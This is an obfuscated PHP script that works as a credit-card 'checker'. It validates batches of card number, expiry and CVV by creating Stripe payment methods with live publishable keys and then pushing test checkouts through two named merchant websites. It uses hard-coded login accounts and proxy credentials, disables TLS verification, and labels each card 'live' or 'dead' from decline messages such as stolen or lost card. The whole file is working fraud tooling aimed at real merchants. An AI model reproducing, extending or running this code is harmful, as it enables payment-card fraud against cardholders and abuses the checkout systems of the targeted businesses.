<?php

$GLOBALS["jjtdbjukm"] = "index";
$GLOBALS["bytlrsqubs"] = "randomString";
$GLOBALS["bugwokfyxt"] = "characters";
$GLOBALS["hixquapmkk"] = "n";
$GLOBALS["rvojosbczop"] = "i";
$GLOBALS["rbfsoi"] = "nonce";
$GLOBALS["elyqeps"] = "p_id";
$GLOBALS["oneamcbzeo"] = "pattern1";
$GLOBALS["vidtigcym"] = "checkout";
$GLOBALS["fvdresf"] = "add_to_cart";
$GLOBALS["tlxgubnrsga"] = "access_base";
$GLOBALS["bejryiei"] = "pattern";
$GLOBALS["anrdipn"] = "text";
$GLOBALS["pxhhlhbymmq"] = "url";
$GLOBALS["cmicpvic"] = "result";
$GLOBALS["vvbcio"] = "data";
$GLOBALS["qwiwjf"] = "ch";
$GLOBALS["ujqxqjvkbhu"] = "cvv";
$GLOBALS["hqwkljzvru"] = "month";
$GLOBALS["krmjcfkqgcl"] = "message";
$GLOBALS["ovdctjwh"] = "output";
$GLOBALS["orteunemgb"] = "livecheck";
$GLOBALS["evnykxkh"] = "stripe";
$GLOBALS["pbyqvkl"] = "year";
$GLOBALS["hkfgijsogcd"] = "cc";
$GLOBALS["dkmeyfcu"] = "split";
$GLOBALS["rlstprxcktgg"] = "txt";
$GLOBALS["jssbdc"] = "myFile";
$GLOBALS["iwfwjuubo"] = "info";
$GLOBALS["dwbjjtzlomru"] = "gate";
$GLOBALS["kcinvvck"] = "checker2";
$vslyqbsm = "checker";
$checker = new Checker();
$checker2 = new Checker2();
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    $gate = "gate1";
    if (isset($_GET["gate"])) {
        $uavehj = "gate";
        $gate = $_GET["gate"];
    }
    if (${$GLOBALS["dwbjjtzlomru"]} == "gate1") {
        $checker->attemptLogin();
    } else {
        $checker2->attemptLogin();
    }
}
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nopnmvg = "info";
    $info = $_POST["info"];
    ${$GLOBALS["dwbjjtzlomru"]} = $_POST["gate"];
    $tnwpsqp = "gate";
    if ($gate == "gate1") {
        $checker->checkCard(${$GLOBALS["iwfwjuubo"]});
    } else {
        $checker2->checkCard(${$GLOBALS["iwfwjuubo"]});
    }
}
class Checker
{
    public $api_login = "https://www.traveldailymedia.com/wp-admin/admin-ajax.php";
    public $stripe_api = "https://52.220.44.249/v1/payment_methods";
    public $vulnerable_api = "https://www.traveldailymedia.com/membership-account-2/membership-checkout/";
    public $proxy_host = "brd.superproxy.io:22225";
    public $proxy_auth = "brd-customer-hl_6a74f53f-zone-data_center:kthxoro98iyj";
    public function writeLog($text)
    {
        $laonzj = "text";
        $mabyvan = "myFile";
        $asgwnclcfs = "txt";
        ${$GLOBALS["jssbdc"]} = fopen("logs1.txt", "a+");
        ${$GLOBALS["rlstprxcktgg"]} = ${$laonzj};
        fwrite(${$mabyvan}, "\n" . ${$asgwnclcfs});
    }
    public function attemptLogin()
    {
        $GLOBALS["wmpazsd"] = "myFile";
        $this->writeLog("Attempting login");
        $GLOBALS["ipnfvzdw"] = "login";
        $mswioubstlr = "result";
        $GLOBALS["irgedlmuclm"] = "myFile";
        $zkuptf = "login";
        $myFile = fopen("cookie.txt", "a+");
        fclose($myFile);
        unlink(getcwd() . "/cookie.txt");
        $login = $this->curlPost($this->api_login, "action=job_seeker_login&username=casopibede%40mailinator.com&password=VGFlazEyMw%3D%3D&redirect_url=https%3A%2F%2Fwww.traveldailymedia.com");
        $result = json_decode($login);
        if ($result->status == 1) {
            $this->checkCard($_GET["info"]);
        } else {
            sleep(30);
            $this->attemptLogin();
        }
    }
    public function checkCard($info)
    {
        $GLOBALS["ofnrnmmzswyd"] = "stripe";
        $duefnl = "month";
        $GLOBALS["jvtxnhhdjcg"] = "split";
        ${$GLOBALS["dkmeyfcu"]} = explode("|", ${$GLOBALS["iwfwjuubo"]});
        ${$GLOBALS["hkfgijsogcd"]} = str_replace(" ", "", $split[0]);
        $GLOBALS["lfqvmoym"] = "cvv";
        $ozkrdrmwb = "p_id";
        $qhkcetkvs = "year";
        $cnkywhblhc = "cvv";
        ${$duefnl} = ${$GLOBALS["dkmeyfcu"]}[1];
        $jsakumt = "cc";
        $nolixrmz = "month";
        ${$qhkcetkvs} = ${$GLOBALS["dkmeyfcu"]}[2];
        $cvv = ${$GLOBALS["dkmeyfcu"]}[3];
        ${$ozkrdrmwb} = null;
        $stripe = $this->curlPost($this->stripe_api, "type=card&card[number]=" . ${$jsakumt} . "&card[cvc]=" . ${$cnkywhblhc} . "&card[exp_month]=" . ${$nolixrmz} . "&card[exp_year]=" . ${$GLOBALS["pbyqvkl"]} . "&guid=62f0d229-4d0d-4b3f-bd0d-6fae6c8b0b77eb5682&muid=48b2bdda-b883-485a-81a0-750d9191096d926287&sid=6cd95f9f-c0e9-4ad2-84f6-ca1543f5d407dcc5b8&pasted_fields=number&payment_user_agent=stripe.js%2Fbc142a0e10%3B+stripe-js-v3%2Fbc142a0e10%3B+split-card-element&time_on_page=165649&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1JfJIKGQPjBo1DYE");
        if (${$GLOBALS["evnykxkh"]}) {
            if (isset(json_decode(${$GLOBALS["evnykxkh"]})->id)) {
                $mmcjny = "message";
                $GLOBALS["kgdxdxt"] = "livecheck";
                $rgmddjkr = "output";
                $GLOBALS["eowonvkh"] = "p_id";
                $GLOBALS["lomkenx"] = "p_id";
                $p_id = json_decode(${$GLOBALS["evnykxkh"]})->id;
                $kphgycorf = "pattern";
                $GLOBALS["hnvqhdtzbn"] = "message";
                $livecheck = $this->curlPost($this->vulnerable_api, "level=2&checkjavascript=1&other_discount_code=&CardType=mastercard&discount_code=&user_id=135189&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id=" . $p_id . "&AccountNumber=XXXXXXXXXXXX3866&ExpirationMonth=10&ExpirationYear=2024");
                $GLOBALS["wjkuyxnireo"] = "pattern";
                $pattern = "/<div id=\"pmpro_message\" class=\"pmpro_message pmpro_error\">(.*?)<\\/div>/m";
                preg_match($pattern, ${$GLOBALS["orteunemgb"]}, $output);
                $message = null;
                if (isset(${$GLOBALS["ovdctjwh"]}[1])) {
                    ${$GLOBALS["krmjcfkqgcl"]} = ${$GLOBALS["ovdctjwh"]}[1];
                }
                if ($message == null) {
                    sleep(30);
                    $this->checkCard(${$GLOBALS["iwfwjuubo"]});
                } else {
                    $nxmcvjyeyke = "livecheck";
                    $GLOBALS["ivfkhxpdbh"] = "livecheck";
                    $onbxzsbq = "livecheck";
                    $txbunorsne = "livecheck";
                    $bimligxh = "livecheck";
                    $hqzvqtqe = "livecheck";
                    $cwfghgkkbn = "livecheck";
                    $GLOBALS["xgywdog"] = "livecheck";
                    $nyxcbx = "livecheck";
                    $eygimnu = "livecheck";
                    $GLOBALS["hlxqjul"] = "livecheck";
                    $GLOBALS["yxplobllkyb"] = "livecheck";
                    if (strpos($livecheck, "/donations/thank_you?donation_number=") || strpos($livecheck, "\"cvc_check\": \"pass\"") || strpos(${$GLOBALS["orteunemgb"]}, "Thank You For Donation.") || strpos($livecheck, "Thank You.") || strpos(${$GLOBALS["orteunemgb"]}, "\"status\": \"succeeded\"") || strpos(${$GLOBALS["orteunemgb"]}, "Your card zip code is incorrect.") || strpos($livecheck, "incorrect_zip") || strpos(strtolower(${$GLOBALS["krmjcfkqgcl"]}), "success") || strpos(${$GLOBALS["orteunemgb"]}, "succeeded.") || strpos(${$GLOBALS["orteunemgb"]}, "\"type\":\"one-time\"") || strpos($livecheck, "fraudulent") || strpos($livecheck, "Your card has insufficient funds.") || strpos(${$GLOBALS["orteunemgb"]}, "insufficient_funds") || strpos($livecheck, "lost_card") || strpos($livecheck, "stolen_card") || strpos(${$GLOBALS["orteunemgb"]}, "security code is invalid.") || strpos(${$GLOBALS["orteunemgb"]}, "incorrect_cvc") || strpos(${$GLOBALS["orteunemgb"]}, "pickup_card") || strpos($livecheck, "Your card security code is incorrect.") || strpos($livecheck, "Your card's security code is incorrect.") || strpos($livecheck, "Your card&#039;s security code is incorrect.")) {
                        echo json_encode(["content" => ${$GLOBALS["hkfgijsogcd"]} . "|" . ${$GLOBALS["hqwkljzvru"]} . "|" . ${$GLOBALS["pbyqvkl"]} . "|" . ${$GLOBALS["ujqxqjvkbhu"]}, "status" => "live", "message" => "please check if ccn or ccv live"]);
                    } else {
                        if (strpos($livecheck, "Suspicious activity detected. Try again in a few minutes.")) {
                            $wvbfyxc = "info";
                            sleep(30);
                            $this->checkCard($info);
                        } else {
                            if (strpos(strtolower(${$GLOBALS["orteunemgb"]}), strtolower("generating your account"))) {
                                sleep(30);
                                $this->checkCard(${$GLOBALS["iwfwjuubo"]});
                            } else {
                                $jdqurbi = "message";
                                $yspqgawv = "year";
                                $GLOBALS["tnuuvpyuxo"] = "cvv";
                                echo json_encode(["content" => ${$GLOBALS["hkfgijsogcd"]} . "|" . ${$GLOBALS["hqwkljzvru"]} . "|" . $year . "|" . $cvv, "status" => "dead", "message" => $message ?? ""]);
                            }
                        }
                    }
                }
            } else {
                $this->writeLog("Retrying again stripe api failed");
                sleep(30);
                $this->checkCard(${$GLOBALS["iwfwjuubo"]});
            }
        } else {
            sleep(30);
            $this->checkCard(${$GLOBALS["iwfwjuubo"]});
        }
    }
    public function curlPost($url, $data)
    {
        try {
            ${$GLOBALS["qwiwjf"]} = curl_init();
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_PROXY, $this->proxy_host);
            $GLOBALS["fuqkxdq"] = "ch";
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_PROXYUSERPWD, $this->proxy_auth);
            $qbumqkx = "ch";
            $wbpwfbcjv = "url";
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_POST, 1);
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_POSTFIELDS, ${$GLOBALS["vvbcio"]});
            $mkcfonq = "ch";
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $GLOBALS["csitiyxq"] = "ch";
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_SSL_VERIFYPEER, 0);
            $qqpiwihrlqg = "result";
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/cookie.txt");
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookie.txt");
            ${$GLOBALS["cmicpvic"]} = curl_exec(${$GLOBALS["qwiwjf"]});
            return ${$qqpiwihrlqg};
        } catch (Exception $e) {
            sleep(30);
            $this->curlPost(${$GLOBALS["pxhhlhbymmq"]}, ${$GLOBALS["vvbcio"]});
        }
    }
}
class Checker2
{
    public $cart_empty = true;
    public $base = "https://coffee.com.au/my-account/";
    public $api_login = "https://coffee.com.au/my-account/";
    public $stripe_api = "https://52.220.44.249/v1/payment_methods";
    public $vulnerable_api = "https://coffee.com.au/?wc-ajax=checkout";
    public $checkout = "https://coffee.com.au/checkout/";
    public $add = "https://coffee.com.au/product/mexico-chiapas-high-grown-organic/";
    public $cart_url = "https://coffee.com.au/cart/";
    public $proxy_host = "brd.superproxy.io:22225";
    public $proxy_auth = "brd-customer-hl_6a74f53f-zone-data_center:kthxoro98iyj";
    public $myfile;
    public function writeLog($text)
    {
        $avkldsulrpw = "txt";
        ${$GLOBALS["jssbdc"]} = fopen("logs2.txt", "a+");
        ${$avkldsulrpw} = ${$GLOBALS["anrdipn"]};
        fwrite(${$GLOBALS["jssbdc"]}, "\n" . ${$GLOBALS["rlstprxcktgg"]});
    }
    public function attemptLogin()
    {
        $gyfnwhi = "access_base";
        $cuyupshw = "myFile";
        $this->writeLog("Attempting login");
        ${$GLOBALS["jssbdc"]} = fopen("cookie.txt", "a+");
        fclose(${$cuyupshw});
        unlink(getcwd() . "/cookie.txt");
        ${$gyfnwhi} = $this->curlGet($this->base);
        ${$GLOBALS["bejryiei"]} = "/<input type=\"hidden\" id=\"woocommerce-login-nonce\" name=\"woocommerce-login-nonce\" value=\"(.*?)\" \\/>/m";
        preg_match(${$GLOBALS["bejryiei"]}, ${$GLOBALS["tlxgubnrsga"]}, ${$GLOBALS["ovdctjwh"]});
        if (isset(${$GLOBALS["ovdctjwh"]}[1])) {
            $kgfpvwph = "login";
            $fiawhl = "login";
            $login = $this->curlPost($this->api_login, "username=hypitihaxa&password=GrHbzVjYnE&woocommerce-login-nonce=" . ${$GLOBALS["ovdctjwh"]}[1] . "&_wp_http_referer=%2Fmy-account%2F&login=Log+in");
            if (strpos($login, "/my-account/edit-address/")) {
                echo json_encode(["logged" => true]);
            } else {
                sleep(30);
                $this->attemptLogin();
            }
        } else {
            $this->attemptLogin();
        }
    }
    public function refreshTokens()
    {
        $mdqifmtv = "access_base";
        $GLOBALS["tbcdef"] = "output";
        $GLOBALS["jzflgwpsy"] = "access_base";
        $this->writeLog("refreshing tokens");
        $GLOBALS["wsfetdcidwh"] = "pattern";
        unlink(getcwd() . "/cookie.txt");
        $access_base = $this->curlGet($this->base);
        $GLOBALS["xebabfvztwj"] = "pattern";
        $pattern = "/<input type=\"hidden\" id=\"woocommerce-login-nonce\" name=\"woocommerce-login-nonce\" value=\"(.*?)\" \\/>/m";
        preg_match($pattern, $access_base, $output);
        if (isset(${$GLOBALS["ovdctjwh"]}[1])) {
            $ivmnrmio = "login";
            $gkcvgwfgtk = "login";
            $ojykfsywyx = "output";
            $login = $this->curlPost($this->api_login, "username=hypitihaxa&password=GrHbzVjYnE&woocommerce-login-nonce=" . $output[1] . "&_wp_http_referer=%2Fmy-account%2F&login=Log+in");
            if (strpos($login, "/my-account/edit-address/")) {
                return true;
            } else {
                sleep(30);
                $this->attemptLogin();
            }
        } else {
            $this->attemptLogin();
        }
    }
    public function checkIfEmpty()
    {
        $this->writeLog("Checking if empty");
        $GLOBALS["hqtjqinskap"] = "cart";
        $cart = $this->curlGet($this->cart_url);
        $GLOBALS["iyqzkitrltw"] = "cart";
        if (strpos($cart, "Your cart is currently empty.")) {
            $GLOBALS["ufmspnvvwyf"] = "data";
            $GLOBALS["lnoblitj"] = "add_to_cart";
            $data = ["attribute_pa_select-a-size" => "250gm", "attribute_pa_beans-or-ground" => "beans", "subscribe-to-action-input" => "no", "convert_to_sub_dropdown29987" => "1_month", "convert_to_sub_29987" => 0, "quantity" => 1, "gtm4wp_id" => 29987, "gtm4wp_internal_id" => 29987, "gtm4wp_name" => "MEXICO - Chiapas High Grown Organic", "gtm4wp_sku" => "MEX CHP-", "gtm4wp_category" => "Mexico Single Origin Coffee", "gtm4wp_price" => 15, "gtm4wp_stocklevel" => "", "add-product-to-subscription" => 29987, "add-to-cart" => 29987, "product_id" => 29987, "variation_id" => 56027];
            $GLOBALS["kwrpebcym"] = "data";
            $add_to_cart = $this->curlPost($this->add, $data);
            if (strpos(${$GLOBALS["fvdresf"]}, "has been added to your cart")) {
                $this->writeLog("Cart is not empty");
                $this->cart_empty = false;
            } else {
                $this->writeLog("Retrying adding to cart");
                $this->checkIfEmpty();
            }
        } else {
            $this->cart_empty = false;
        }
    }
    public function getCheckoutNonce()
    {
        $this->writeLog("Getting checkout nonce");
        $GLOBALS["vvjiqidmv"] = "pattern1";
        ${$GLOBALS["vidtigcym"]} = $this->curlGet($this->checkout);
        ${$GLOBALS["oneamcbzeo"]} = "/<input type=\"hidden\" id=\"woocommerce-process-checkout-nonce\" name=\"woocommerce-process-checkout-nonce\" value=\"(.*?)\" \\/>/m";
        $GLOBALS["ulnzmk"] = "output";
        preg_match($pattern1, ${$GLOBALS["vidtigcym"]}, ${$GLOBALS["ovdctjwh"]});
        if (isset($output[1])) {
            $ehohfhmolyck = "output";
            $dbrvif = "output";
            $this->writeLog($output[1]);
            return $output[1];
        } else {
            $this->writeLog("Retrying getting nonce");
            $this->getCheckoutNonce();
        }
    }
    public function checkCard($info)
    {
        $GLOBALS["xppeygkyy"] = "split";
        $djkjmqpo = "cc";
        $GLOBALS["snzovwv"] = "month";
        $GLOBALS["bbwkityv"] = "cvv";
        $uxpqbdpynbz = "split";
        if ($this->cart_empty) {
            $this->writeLog("Check card: checking if empty");
            $this->checkIfEmpty();
        }
        ${$GLOBALS["dkmeyfcu"]} = explode("|", ${$GLOBALS["iwfwjuubo"]});
        ${$GLOBALS["hkfgijsogcd"]} = str_replace(" ", "", $split[0]);
        $GLOBALS["bopgufhn"] = "stripe";
        ${$GLOBALS["hqwkljzvru"]} = ${$GLOBALS["dkmeyfcu"]}[1];
        $tlilelyuk = "stripe";
        ${$GLOBALS["pbyqvkl"]} = ${$GLOBALS["dkmeyfcu"]}[2];
        $cvv = ${$uxpqbdpynbz}[3];
        ${$GLOBALS["elyqeps"]} = null;
        ${$tlilelyuk} = $this->curlPost($this->stripe_api, "type=card&billing_details[name]=" . $this->getName(5) . "&billing_details[address][line1]=" . $this->getName(10) . "&billing_details[address][line2]=" . $this->getName(5) . "&billing_details[address][state]=VIC&billing_details[address][city]=" . $this->getName(5) . "&billing_details[address][postal_code]=" . $this->getName(5) . "&billing_details[address][country]=AU&billing_details[email]=" . $this->getName(5) . "%40mailinator.com&billing_details[phone]=%2B1+(" . $this->getNumber(3) . ")+" . $this->getNumber(3) . "-" . $this->getNumber(4) . "&card[number]=" . ${$djkjmqpo} . "&card[cvc]=" . ${$GLOBALS["ujqxqjvkbhu"]} . "&card[exp_month]=" . $month . "&card[exp_year]=" . ${$GLOBALS["pbyqvkl"]} . "&guid=1ba6b205-f848-42c1-9e99-04f2949a8541e4e43d&muid=5799192a-44dd-471b-b658-64e02ac251d73fcb58&sid=6a619a1d-d612-46e2-90b6-4b2fd7f1c4a15eb8ad&pasted_fields=number&payment_user_agent=stripe.js%2Fbc142a0e10%3B+stripe-js-v3%2Fbc142a0e10%3B+split-card-element&time_on_page=3412125&key=pk_live_51LgKs6EaEIFkBtaAHAEfO8ynYj8X3WNql8J6VfUICmdGxdzvBNwt3SqzmtGpJ8BAp8Nm32Dp7fXOPOpa2KzbLbEn00xpgCEnfH");
        if ($stripe) {
            $ritjtflcohg = "stripe";
            if (isset(json_decode($stripe)->id)) {
                $GLOBALS["boirltjoii"] = "stripe";
                $GLOBALS["goiwyczjvq"] = "p_id";
                ${$GLOBALS["elyqeps"]} = json_decode($stripe)->id;
                $GLOBALS["vmtxqq"] = "livecheck";
                ${$GLOBALS["rbfsoi"]} = $this->getCheckoutNonce();
                ${$GLOBALS["orteunemgb"]} = $this->curlPost($this->vulnerable_api, "add-to-subscription-checked=yes&shipping_state=NT&billing_state=NT&order_comments=" . $this->getName(5) . "&shipping_postcode=" . $this->getName(5) . "&shipping_city=" . $this->getName(5) . "&shipping_address_2=" . $this->getName(5) . "&shipping_address_1=" . $this->getName(10) . "&shipping_company=" . $this->getName(15) . "&shipping_last_name=" . $this->getName(5) . "&shipping_first_name=" . $this->getName(5) . "&authority_to_leave=No&shipping_country=AU&mailchimp_woocommerce_newsletter=1&billing_email=" . $this->getName(5) . "%40mailinator.com&billing_phone=%2B1+(" . $this->getNumber(3) . ")+" . $this->getNumber(3) . "-" . $this->getNumber(4) . "&billing_postcode=" . $this->getName(10) . "&billing_city=" . $this->getName(10) . "&billing_address_2=" . $this->getName(10) . "&billing_address_1=" . $this->getName(10) . "&billing_country=AU&billing_company=" . $this->getName(10) . "&billing_last_name=" . $this->getName(5) . "&billing_first_name=" . $this->getName(5) . "&mailchimp_woocommerce_newsletter=1&billing_email=" . $this->getName(5) . "%40mailinator.com&billing_phone=%2B1+(" . $this->getNumber(3) . ")+" . $this->getNumber(3) . "-" . $this->getNumber(54) . "&billing_postcode=" . $this->getName(5) . "&billing_city=" . $this->getName(5) . "&billing_address_2=" . $this->getName(5) . "&billing_address_1=" . $this->getName(5) . "&billing_company=" . $this->getName(5) . "&billing_last_name=" . $this->getName(5) . "&billing_first_name=" . $this->getName(5) . "&billing_country=AU&payment_method=stripe&wc-stripe-new-payment-method=true&terms=on&terms-field=1&woocommerce-process-checkout-nonce=" . ${$GLOBALS["rbfsoi"]} . "&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&add-to-subscription-checked=yes&wcsatt_nonce=ce76e3bc30&_wp_http_referer=%2F%3Fwc-ajax%3Dwcsatt_load_subscriptions_matching_cart&stripe_source=" . $p_id);
                if ($livecheck) {
                    $grqorrjxectq = "livecheck";
                    ${$GLOBALS["cmicpvic"]} = json_decode($livecheck);
                    $this->writeLog(json_encode(${$GLOBALS["cmicpvic"]}));
                    if ($result->result == "success") {
                        $qumfpfn = "month";
                        $GLOBALS["cjnpcnlynjs"] = "cc";
                        echo json_encode(["content" => $cc . "|" . $month . "|" . ${$GLOBALS["pbyqvkl"]} . "|" . ${$GLOBALS["ujqxqjvkbhu"]}, "status" => "live", "message" => "please check if ccn or cvv live"]);
                    } else {
                        if ($result->result == "failure") {
                            $lxhlvkgj = "message";
                            $GLOBALS["xuavyljwgwyv"] = "pattern";
                            $GLOBALS["jrmxywivvwj"] = "pattern";
                            $pattern = "/<ul class=\"woocommerce-error\" role=\"alert\">.*?<li>(.*?)<\\/li>.*?<\\/ul>/ms";
                            preg_match($pattern, $result->messages, $message);
                            if (strpos(strtolower($result->messages), "suspicious") || strpos(strtolower($result->messages), "try again") || strpos(strtolower($result->messages), "please retry later")) {
                                $this->refreshTokens();
                                $yqeewlaj = "info";
                                $this->checkCard($info);
                            } else {
                                if (strpos(strtolower($result->messages), "security code is incorrect")) {
                                    $GLOBALS["yvgclewg"] = "cc";
                                    $pmbycvpbovl = "year";
                                    $GLOBALS["gbyrxa"] = "month";
                                    $yqsveuymmx = "cvv";
                                    echo json_encode(["content" => $cc . "|" . $month . "|" . $year . "|" . $cvv, "status" => "live", "message" => "ccn live"]);
                                } else {
                                    $GLOBALS["mhgwedqj"] = "cvv";
                                    echo json_encode(["content" => ${$GLOBALS["hkfgijsogcd"]} . "|" . ${$GLOBALS["hqwkljzvru"]} . "|" . ${$GLOBALS["pbyqvkl"]} . "|" . $cvv, "status" => "dead", "message" => ${$GLOBALS["krmjcfkqgcl"]}[1]]);
                                }
                            }
                        }
                    }
                } else {
                    $this->writeLog("Failed to fetch data from second level trying again");
                    sleep(30);
                    $this->checkCard(${$GLOBALS["iwfwjuubo"]});
                }
            } else {
                $GLOBALS["wlkpmbxj"] = "info";
                $this->writeLog("Retrying again stripe api failed");
                sleep(30);
                $this->checkCard($info);
            }
        } else {
            $GLOBALS["corofnd"] = "info";
            $this->writeLog("Failed to fetch data from first level trying again");
            sleep(30);
            $this->checkCard($info);
        }
    }
    public function curlPost($url, $data)
    {
        try {
            $GLOBALS["gcviyjmkcna"] = "ch";
            $okeylgeoi = "ch";
            $kdwnseslp = "ch";
            $ddzfkfw = "ch";
            $wfmhxrscka = "ch";
            $ch = curl_init();
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_PROXY, $this->proxy_host);
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_PROXYUSERPWD, $this->proxy_auth);
            curl_setopt($ch, CURLOPT_URL, ${$GLOBALS["pxhhlhbymmq"]});
            $GLOBALS["mxdjpxiykng"] = "ch";
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_POST, 1);
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_POSTFIELDS, ${$GLOBALS["vvbcio"]});
            $tycgxutamse = "ch";
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36");
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_COOKIEFILE, getcwd() . "/cookie.txt");
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookie.txt");
            ${$GLOBALS["cmicpvic"]} = curl_exec($ch);
            return ${$GLOBALS["cmicpvic"]};
        } catch (Exception $e) {
            sleep(30);
            $this->curlPost(${$GLOBALS["pxhhlhbymmq"]}, ${$GLOBALS["vvbcio"]});
        }
    }
    public function curlGet($url)
    {
        try {
            $GLOBALS["pobibgrlbul"] = "ch";
            $uahflihi = "ch";
            $ch = curl_init();
            $GLOBALS["mtxuuj"] = "result";
            ${$GLOBALS["qwiwjf"]} = curl_init(${$GLOBALS["pxhhlhbymmq"]});
            $zulnrus = "result";
            $GLOBALS["vxdmybuj"] = "ch";
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_PROXY, $this->proxy_host);
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_PROXYUSERPWD, $this->proxy_auth);
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_FOLLOWLOCATION, 1);
            $GLOBALS["eilpgbeql"] = "ch";
            $GLOBALS["vavjbsevjxu"] = "ch";
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $ooeobjc = "ch";
            curl_setopt(${$GLOBALS["qwiwjf"]}, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36");
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/cookie.txt");
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookie.txt");
            $result = curl_exec(${$GLOBALS["qwiwjf"]});
            return $result;
        } catch (Exception $e) {
            sleep(30);
            $GLOBALS["tkcrrvuej"] = "url";
            $this->curlGet($url);
        }
    }
    public function getName($n)
    {
        $matmkfhlbx = "randomString";
        $izkiwkxa = "characters";
        $GLOBALS["cfbkpsivpxl"] = "i";
        $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $randomString = "";
        for ($i = 0; ${$GLOBALS["rvojosbczop"]} < ${$GLOBALS["hixquapmkk"]}; ${$GLOBALS["rvojosbczop"]}++) {
            $nmcipmotjog = "index";
            $GLOBALS["khldhedk"] = "index";
            $index = rand(0, strlen(${$GLOBALS["bugwokfyxt"]}) - 1);
            $mfhojliq = "characters";
            ${$GLOBALS["bytlrsqubs"]} .= $characters[$index];
        }
        $paojwymr = "randomString";
        return $randomString;
    }
    public function getNumber($n)
    {
        $yfjysamykpdl = "randomString";
        $bfsiimaybji = "i";
        ${$GLOBALS["bugwokfyxt"]} = "0123456789";
        ${$GLOBALS["bytlrsqubs"]} = "";
        for (${$GLOBALS["rvojosbczop"]} = 0; ${$GLOBALS["rvojosbczop"]} < ${$GLOBALS["hixquapmkk"]}; ${$bfsiimaybji}++) {
            ${$GLOBALS["jjtdbjukm"]} = rand(0, strlen(${$GLOBALS["bugwokfyxt"]}) - 1);
            ${$GLOBALS["bytlrsqubs"]} .= ${$GLOBALS["bugwokfyxt"]}[${$GLOBALS["jjtdbjukm"]}];
        }
        return ${$yfjysamykpdl};
    }
}
